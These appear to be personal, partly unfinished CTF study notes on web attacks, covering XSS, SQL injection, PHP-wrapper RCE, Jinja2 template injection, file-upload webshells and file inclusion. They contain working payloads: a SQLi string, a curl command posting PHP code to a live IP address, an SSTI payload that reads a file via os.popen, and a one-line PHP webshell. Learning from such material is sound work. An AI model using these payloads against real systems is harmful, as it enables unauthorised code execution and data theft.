XSS: Common exploit
        - Exploits the single-origin policy, embed harmful JS into website.                                                                                                                                              - When origin is opened by another user, malicious JS steals info related to their browser.

SQLi: Common login screen attack
        - if " ' " is typed into a parameter and the webpage returns error, very likely a SQLi
        - ' OR 1=1 --                                                                                                                                                                                                    - Extremely popular and likely patched.

RCE:                                                                                                                                                                                                                     - Just did it with php wrappers:
        - curl -X POST 'http://3.105.27.130:8001/?lang=php://input' \ --data "<?php system('ls -la'); ?>"
        - PHP wrappers are a great exploit

SSTI: server-side template injection.
        - Unsanitized user input asked, which also executed code in {{}}. This is a hint of a Jinja2 template engine being used that is directly concatanating our data to the template.                                 - The server can then be made to execute valid template syntax.
        - CTF example payload used: {{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag').read() }}
        - https://portswigger.net/web-security/server-side-template-injection

        - Another CTF required sending data in {{ ... }}. This took advantage of the `render_template_string()` function that prints and evaluates the string inside as a template.                                      - This is a form of code execution within web-app contexts. Any string inside is read and executed by the jinja2 engine.
        - Hence any code inside {{ ... }} gets executed.

Unsanitized file upload:                                                                                                                                                                                                 - Basic PHP shell gained. PHP is executed server-side, therefore giving a payload php file can be executed if file upload is unsanitized.
        - In a ctf, RCE was gained by uploading a webshell payload (<?php echo passthru($_GET['cmd']); ?>) php file.
        - Server executed the php code within (hence no proper san.). Make sure you pass "cmd" as a parameter in the URL.

Misfigured API endpoints:
        - ???

PHP Remote file inclusions:
        - occurs when no validatin is done on user-supplied paramters being directly incorporated into "include()" function in php (eg ?FILE=... used in include())                                                      - Attacker can pass the domain name of an external source (http://attacker_site/malicous_page) as the parameter, including the remote file directly and executing it.

Local file inclusions:
        - Cannot just redirect to an external website. Instead, include() can fetch files in the system.                                                                                                                 - PHP wrapper variation:

SSRF:
        -
